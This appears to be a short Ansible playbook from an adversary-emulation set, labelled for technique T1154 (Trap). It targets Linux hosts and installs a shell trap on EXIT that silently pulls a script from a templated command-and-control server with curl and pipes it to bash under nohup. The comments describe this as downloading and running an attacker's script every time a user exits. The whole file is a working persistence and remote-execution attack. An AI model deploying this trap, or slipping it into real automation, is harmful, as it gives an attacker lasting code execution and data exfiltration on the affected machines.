# Playbook-T1154
# download and execute shell script everytime users exist
# Attacker have webserver listting on https to download the script
- name : Trap
  hosts: linux
  vars_files:
   - /opt/ansible/vars.yaml
  tasks:
    - name:
      shell: |
        trap 'nohup curl -sS https://{{ cnc_fqdn }}:{{ cnc_port}}/{{ exfil_script}} | bash' EXIT
      
